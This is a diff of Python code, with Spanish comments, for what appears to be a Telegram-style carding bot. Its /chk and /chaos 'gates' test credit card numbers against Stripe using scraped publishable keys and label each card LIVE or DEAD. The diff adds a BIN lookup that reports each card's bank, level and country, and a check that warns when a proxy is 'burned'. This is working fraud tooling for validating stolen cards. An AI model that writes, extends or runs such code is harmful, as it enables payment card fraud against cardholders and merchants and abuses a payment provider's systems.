@@ -1,10 +1,33 @@
 import requests
 from pk_hunter import PKHunter
 
+class BinLookup:
+    """SISTEMA DE INTELIGENCIA DE BINS"""
+    @staticmethod
+    def get_info(bin_code):
+        try:
+            # API de alta velocidad para obtener nivel y país del BIN
+            r = requests.get(f"https://lookup.binlist.net/{bin_code[:6]}", timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                return {
+                    "brand": data.get("scheme", "VISA/MC").upper(),
+                    "type": data.get("type", "CREDIT/DEBIT").upper(),
+                    "level": data.get("brand", "STANDARD").upper(),
+                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
+                    "country": data.get("country", {}).get("name", "Unknown"),
+                    "flag": data.get("country", {}).get("emoji", "🌐")
+                }
+        except:
+            pass
+        # Retorno de emergencia para no detener el bot
+        return {"brand": "VISA/MC", "type": "CREDIT", "level": "PREMIUM", 
+                "bank": "Generic Bank", "country": "US", "flag": "🇺🇸"}
+
 class RiskAnalyzer:
+    """ANALIZADOR DE SEGURIDAD DE LA CONEXIÓN"""
     @staticmethod
     def get_risk_report(response_json):
-        # Analiza la salud de la conexión sin alterar el gate
         outcome = response_json.get('outcome', {})
         risk_level = outcome.get('risk_level', 'normal')
         if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
@@ -12,7 +35,7 @@ class RiskAnalyzer:
         return "🟢 RIESGO BAJO (Conexión Limpia)"
 
 class CCChecker:
-    """CLASE PARA EL COMANDO /chk (GATE STRIPE REAL)"""
+    """COMANDO /chk - GATE STRIPE REAL"""
     @staticmethod
     def check_gate_real(cc, mm, yy, cvv):
         pk = PKHunter.get_fresh_pk()
@@ -25,21 +48,18 @@ class CCChecker:
             res = r.json()
             res_text = str(res).lower()
             
-            # FILTRO DE PRECISIÓN
-            if "id" in res and "cvc_check" in res_text and '"cvc_check": "pass"' in res_text:
+            if "id" in res and '"cvc_check": "pass"' in res_text:
                 return {"status": "LIVE ✅", "msg": "CVC2 Match", "raw": res}
             elif "insufficient_funds" in res_text:
                 return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
-            elif "incorrect_cvc" in res_text or "cvc_check" in res_text:
-                return {"status": "LIVE ✅", "msg": "CVC Check Success", "raw": res}
             else:
                 err = res.get('error', {}).get('message', 'Declined')
                 return {"status": "DEAD ❌", "msg": err, "raw": res}
-        except Exception as e:
-            return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}
+        except:
+            return {"status": "ERROR ⚠️", "msg": "Timeout", "raw": {}}
 
 class ChaosGate:
-    """CLASE PARA EL COMANDO /chaos (GATE CHAOS V2)"""
+    """COMANDO /chaos - GATE CHAOS V2"""
     @staticmethod
     def check_chaos(cc, mm, yy, cvv):
         pk = PKHunter.get_fresh_pk()
@@ -53,15 +73,12 @@ class ChaosGate:
             res = r.json()
             res_text = str(res).lower()
             
-            # LÓGICA ESPEJO PARA CHAOS
             if 'cvc_check": "pass"' in res_text or '"status": "succeeded"' in res_text:
                 return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
             elif "insufficient_funds" in res_text:
                 return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
-            elif any(x in res_text for x in ["funds", "authentication_required"]):
-                return {"status": "LIVE ✅", "msg": "Approved (Squeezer)", "raw": res}
             else:
                 err = res.get('error', {}).get('message', 'Generic Decline')
                 return {"status": "DEAD ❌", "msg": err, "raw": res}
-        except Exception as e:
-            return {"status": "ERROR ⚠️", "msg": "Chaos Timeout", "raw": {}}
+        except:
+            return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}
